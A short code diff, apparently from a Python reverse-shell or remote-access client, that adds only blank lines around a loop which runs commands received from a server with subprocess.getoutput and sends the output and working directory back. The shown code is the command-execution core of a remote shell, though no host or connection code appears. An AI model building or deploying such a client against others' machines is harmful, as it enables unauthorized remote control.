@@ -51,9 +51,12 @@ class client:
                 else:
                     # if operation is successful, empty message
                     output = ""
+            
+
             else:
                 # execute the command and retrieve the results
                 output = subprocess.getoutput(command)
+            
             # get the current working directory as output
             cwd = os.getcwd()
             # send the results back to the server
